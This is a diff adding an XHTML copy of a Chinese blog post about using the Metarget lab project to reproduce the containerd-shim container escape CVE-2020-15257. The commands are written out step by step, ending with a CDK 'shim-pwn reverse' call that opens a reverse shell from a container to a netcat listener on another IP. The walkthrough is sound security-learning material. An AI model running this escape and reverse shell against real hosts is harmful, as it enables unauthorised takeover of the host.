@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Metarget的实践（一）</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>Metarget的实践（一）</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&amp;mid=2650746601&amp;idx=1&amp;sn=20d4fcfc805e4be11a5221e5bed474e8&amp;chksm=87148fe9b06306ff0fbb99a1b4764e6a5a9a6efed3d7881f2e305d2f86cc51e0d1be57a895c5&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&amp;mid=2650746601&amp;idx=1&amp;sn=20d4fcfc805e4be11a5221e5bed474e8&amp;chksm=87148fe9b06306ff0fbb99a1b4764e6a5a9a6efed3d7881f2e305d2f86cc51e0d1be57a895c5&amp;scene=27#wechat_redirect</a></blockquote><p>Metarget是一个开源的容器安全靶机项目，经过验证很方便搭建模拟靶机环境，如下是验证记录，</p><p>使用ubuntu18.04，下载项目源码，</p><p>git clone https://github.com/Metarget/metarget.git，</p><p>安装pip3，sudo apt install python3-pip，</p><p>安装环境软件，cd metarget，pip3 install -r requirements.txt，</p><p>接着就可以创建自己需要的靶机了，</p><p>以cve-2020-15257为例，参考链接，</p><p>https://github.com/Metarget/metarget/tree/master/writeups_cnv/docker-containerd-cve-2020-15257，</p><p>安装，./metarget cnv install cve-2020-15257，发现抱错，</p><p>加个参数，看看问题是啥，</p><p>./metarget cnv install cve-2020-15257 --verbose，</p><p>原来是权限问题，需要给root权限，重新来过，</p><p>sudo ./metarget cnv install cve-2020-15257，</p><p>等一会儿就安装成功了，接着做攻击实验，</p><p>拉起一个靶机容器，</p><p>sudo docker run -it --net=host --name=15257 ubuntu /bin/bash，</p><p>可以查看不安全套接字，cat /proc/net/unix|grep -a "containerd-shim"，</p><p>还是攻击更能看效果，先给容器靶机安装个netcat，</p><p>apt update，apt install netcat，开启个端口监听，nc -lnvp 1234，</p><p>回到宿主机，下载漏洞利用软件，CDK，</p><p>wget https://github.com/cdk-team/CDK/releases/download/v1.0.4/cdk_linux_amd64，</p><p>把CDK拷贝到靶机容器，sudo docker cp cdk_linux_amd64 15257:/tmp，</p><p>再次进入靶机容器，sudo docker exec -it 15257 bash，</p><p>修改CDK文件的权限，cd /tmp，chmod +x cdk_linux_amd64，</p><p>执行CDK，进行漏洞利用，开始逃逸，</p><p>./cdk_linux_amd64 run shim-pwn reverse 10.90.11.162 1234，</p><p>端口监听那边就拿到宿主机的shell了，</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" data-fileid="503262949" data-ratio="0.7855648535564853" data-s="300,640" data-src="https://mmbiz.qpic.cn/mmbiz_png/F6TniceRacJ0ha16LB56No8NSptmK5Wocx5WMicCXYwgvunA5OomTIvk1sAmJ82w1OWrIhkVacDlMzrXHhwBNwYA/640?wx_fmt=png" data-type="png" data-w="956" style="" src="../Images/ba1c7c73a19bd9e6b439e21da7584813.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/F6TniceRacJ0ha16LB56No8NSptmK5Wocx5WMicCXYwgvunA5OomTIvk1sAmJ82w1OWrIhkVacDlMzrXHhwBNwYA/640?wx_fmt=png"/></p><p><br/></p>
+        
+</body>
+</html>
